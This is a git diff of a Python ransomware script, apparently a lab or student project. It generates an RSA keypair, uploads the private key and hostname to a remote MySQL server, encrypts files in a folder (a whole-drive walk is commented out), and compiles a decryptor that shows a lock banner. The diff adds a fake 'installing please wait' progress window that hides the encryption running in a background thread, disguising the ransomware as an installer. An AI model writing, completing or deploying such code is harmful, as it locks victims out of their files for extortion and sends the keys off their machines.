@@ -16,6 +16,23 @@ import win32api
 import os
 from datetime import datetime
 import mysql.connector
+import ctypes
+
+import tkinter as tk
+from tkinter import ttk
+from threading import Thread
+from time import sleep
+
+
+
+def progessbar_loop():
+    global i, root
+    progressbar['value'] = i*10;
+    i+=1
+    if(i == 11):
+        i=0
+
+    root.after(500, progessbar_loop)
 
 
 def protect_Code_Files(filename):
@@ -26,96 +43,97 @@ def protect_Code_Files(filename):
         return True
     return False
 
+def crypt():
+    # ############################ 1- safeguard ################################
+    code = input("enter the launching code\n")
+    if code != "go":
+        quit()
 
-# ############################ 1- safeguard ################################
-code = input("enter the launching code\n")
-if code != "go":
-    quit()
+    # ############################ 2- generate key ################################
 
-# ############################ 2- generate key ################################
+    print('################## Key generation ##################')
+    # generate a keypair
+    (pubkey, privkey) = newkeys(1024)
+    print(pubkey)
+    print(privkey)
 
-print('################## Key generation ##################')
-# generate a keypair
-(pubkey, privkey) = newkeys(1024)
-print(pubkey)
-print(privkey)
+    input(">")
+    # ############################ 3- save key and the host name to a server ################################
+    hostname = os.getenv('COMPUTERNAME')
+    time = datetime.now()
+    publicKey = str(pubkey.n) + "," + str(pubkey.e)
+    privateKey = str(privkey.n) + "," + str(privkey.e) + "," + str(privkey.d) + "," + str(privkey.p) + "," + str(privkey.q)
+    # connect to the database
+    cnx = mysql.connector.connect(user='root', password='', host='192.168.1.6', database='ransomkey')
+    cursor = cnx.cursor()
 
-input(">")
-# ############################ 3- save key and the host name to a server ################################
-hostname = os.getenv('COMPUTERNAME')
-time = datetime.now()
-publicKey = str(pubkey.n) + "," + str(pubkey.e)
-privateKey = str(privkey.n) + "," + str(privkey.e) + "," + str(privkey.d) + "," + str(privkey.p) + "," + str(privkey.q)
-# connect to the database
-cnx = mysql.connector.connect(user='root', password='', host='192.168.1.6', database='ransomkey')
-cursor = cnx.cursor()
+    input('wait')
+    # insert into database
+    insert_query = "INSERT INTO ransomkeys (time, hostname, public_key, private_key) VALUES (%s, %s, %s, %s)"
+    values = (str(time), str(hostname), str(publicKey), str(privateKey))
+    cursor.execute(insert_query, values)
+    cnx.commit()  # commit the transaction
 
-input('wait')
-# insert into database
-insert_query = "INSERT INTO ransomkeys (time, hostname, public_key, private_key) VALUES (%s, %s, %s, %s)"
-values = (str(time), str(hostname), str(publicKey), str(privateKey))
-cursor.execute(insert_query, values)
-cnx.commit()  # commit the transaction
+    # close the cursor and connection
+    cursor.close()
+    cnx.close()
 
-# close the cursor and connection
-cursor.close()
-cnx.close()
+    input(">")
 
-input(">")
+    # ############################ 4- go through the files ################################
+    drives = win32api.GetLogicalDriveStrings()
+    drives = drives.split('\000')[:-1]
 
-# ############################ 4- go through the files ################################
-drives = win32api.GetLogicalDriveStrings()
-drives = drives.split('\000')[:-1]
+    # for drive in drives:
+    #     for dirpath, dirnames, filenames in os.walk(drive):
+    #         for filename in filenames:
+    #             if protect_Code_Files(filename) == False:
+    #                 file = os.path.join(dirpath, filename)
+    #                 try:
+    #                     # ############################ 5- encrypt the files ################################
+    #                     encrypt_file(file, pubkey)
+    #                     print(file)
+    #                 except:
+    #                     print("can't encrypt the file : " + str(file))
 
-# for drive in drives:
-#     for dirpath, dirnames, filenames in os.walk(drive):
-#         for filename in filenames:
-#             if protect_Code_Files(filename) == False:
-#                 file = os.path.join(dirpath, filename)
-#                 try:
-#                     # ############################ 5- encrypt the files ################################
-#                     encrypt_file(file, pubkey)
-#                     print(file)
-#                 except:
-#                     print("can't encrypt the file : " + str(file))
+    drive = "C:\\Users\\win10\\Desktop\\Test"
 
-drive = "C:\\Users\\win10\\Desktop\\Test"
-for dirpath, dirnames, filenames in os.walk(drive):
-        for filename in filenames:
-            if protect_Code_Files(filename) == False:
-                file = os.path.join(dirpath, filename)
-                try:
-                    # ############################ 5- encrypt the files ################################
-                    encrypt_file(file, pubkey)
-                    print(file)
-                except:
-                    print("can't encrypt the file : " + str(file))
+    for dirpath, dirnames, filenames in os.walk(drive):
+            for filename in filenames:
+                if protect_Code_Files(filename) == False:
+                    file = os.path.join(dirpath, filename)
+                    try:
+                        # ############################ 5- encrypt the files ################################
+                        encrypt_file(file, pubkey)
+                        print(file)
+                    except:
+                        print("can't encrypt the file : " + str(file))
 
-input(">")
+    input(">")
 
-# ############################ 6- show encryption screen ################################
-import ctypes
-
-# define constants
-SPI_SETDESKWALLPAPER = 20
-SPIF_UPDATEINIFILE = 0x01
-SPIF_SENDWININICHANGE = 0x02
-
-# set the path to your desired image file
-image_path = r"C:\\Users\\win10\\Desktop\\pythonProject\\image.png"
-
-# call the SystemParametersInfo function to set the desktop wallpaper
-ctypes.windll.user32.SystemParametersInfoW(
-    SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
+    # ############################ 6- show encryption screen ################################
 
 
-# ############################ 7- create decryptor program ################################
-import subprocess
+    # define constants
+    # SPI_SETDESKWALLPAPER = 20
+    # SPIF_UPDATEINIFILE = 0x01
+    # SPIF_SENDWININICHANGE = 0x02
 
-program_code = '''
+    # # set the path to your desired image file
+    # image_path = r"C:\\Users\\win10\\Desktop\\pythonProject\\image.png"
+
+    # # call the SystemParametersInfo function to set the desktop wallpaper
+    # ctypes.windll.user32.SystemParametersInfoW(
+    #     SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
+
+
+    # ############################ 7- create decryptor program ################################
+    import subprocess
+
+    program_code = '''
 import os
 import sys
- 
+
 # adding Folder_2 to the system path
 sys.path.insert(0, 'C:\\\\Users\\\\win10\\\\Desktop\\\\pythonProject')
 
@@ -146,7 +164,7 @@ def decrypt():
     hostname = []
     hostname.append(os.getenv('COMPUTERNAME'))
     cnx = mysql.connector.connect(user='root', password='',
-                               host='192.168.1.6', database='ransomkey')
+                            host='192.168.1.6', database='ransomkey')
     cursor = cnx.cursor()
     query = "SELECT private_key FROM ransomkeys where hostname=%s"
     params = (hostname)
@@ -161,21 +179,71 @@ def decrypt():
         else:
             print("wrong key")
 
+lock = \'''\\033[1;32m
+                                                                             .--------.
+                                                                            / .------. \\\\
+                                                                           / /        \ \\\\
+                                                                           | |        | |
+                                                                          _| |________| |_
+                                                                        .' |_|        |_| '.
+                                                                        '._____ ____ _____.'
+                                                                        |     .'____'.     |
+                                                                        '.__.'.'    '.'.__.'
+                                                                        '.__  |      |  __.'
+                                                                        |   '.'.____.'.'   |
+                                                                        '.____'.____.'____.'
+                                                                        '.________________.'
+
+)\.---.   )\  )\  .-,.-.,-.  )\.---.     /`-.           .'(   )\.---.  )\    /(      .-,.-.,-.    .-./(          )\.-.   )\.---.     )\.-.     /`-.  )\    /(    /`-.  .-,.-.,-. 
+(   ,-._( (  \, /  ) ,, ,. ( (   ,-._(  ,' _  \       ,')\  ) (   ,-._( \ (_.' /      ) ,, ,. (  ,'     )       ,'     ) (   ,-._(  ,' ,-,_)  ,' _  \ \ (_.' /  ,' _  \ ) ,, ,. ( 
+\  '-,    ) \ (   \( |(  )/  \  '-,   (  '-' (      (  '/ /   \  '-,    )  _.'       \( |(  )/ (  .-, (       (  .-, (   \  '-,   (  .   _  (  '-' (  )  _.'  (  '-' ( \( |(  )/ 
+) ,-`   ( ( \ \     ) \      ) ,-`    ) ,_ .'       )   (     ) ,-`    / /             ) \     ) '._\ )       ) '._\ )   ) ,-`    ) '..' )  ) ,_ .'  / /      ) ,._.'    ) \    
+(  ``-.   `.)/  )    \ (     (  ``-.  (  ' ) \      (  .\ \   (  ``-.  (  \             \ (    (  ,   (       (  ,   (   (  ``-.  (  ,   (  (  ' ) \ (  \     (  '        \ (    
+)..-.(      '.(      )/      )..-.(   )/   )/       )/  )/    )..-.(   ).'              )/     )/ ._.'        )/ ._.'    )..-.(   )/'._.'   )/   )/  ).'      )/          )/    
+\'''
+print (lock)
+key= input()
 decrypt()
 
-'''
+    '''
 
-program_code = program_code.replace('\0', '')
-program_name = "decryptor.py"
-program_path = f"./{program_name}"
+    program_code = program_code.replace('\0', '')
+    program_name = "decryptor.py"
+    program_path = f"./{program_name}"
 
-with open(program_path, 'w') as f:
-    f.write(program_code)
+    with open(program_path, 'w') as f:
+        f.write(program_code)
 
-subprocess.run(f"pyinstaller {program_name} --onefile")
+    subprocess.run(f"pyinstaller {program_name} --onefile")
 
-os.remove(program_path)
+    os.remove(program_path)
 
-#subprocess.run(f"./dist/{program_name.split('.')[0]}")
+    #subprocess.run(f"./dist/{program_name.split('.')[0]}")
 
-# trojan horse : allahou a3lem
+    # trojan horse : allahou a3lem
+
+
+i = 1
+root = tk.Tk()
+root.title("installing")
+
+progressbar = ttk.Progressbar()
+progressbar.configure(length = 100, mode = 'indeterminate')
+progressbar.place(x=100, y=150, width=400)
+label = ttk.Label(text="installing please wait", foreground="green", background="white", font=('Helvetica bold', 15))
+label.place(x=200, y=40)
+
+root.geometry("")
+root.configure(background="white")
+
+
+windowWidth = 600
+windowHeight = 250
+
+positionRight = int(root.winfo_screenwidth()/2 - windowWidth/2)
+positionDown = int(root.winfo_screenheight()/2 - windowHeight/2)
+
+root.geometry("600x250+{}+{}".format(positionRight, positionDown))
+root.after(500, progessbar_loop)
+Thread(target=crypt).start()
+root.mainloop()
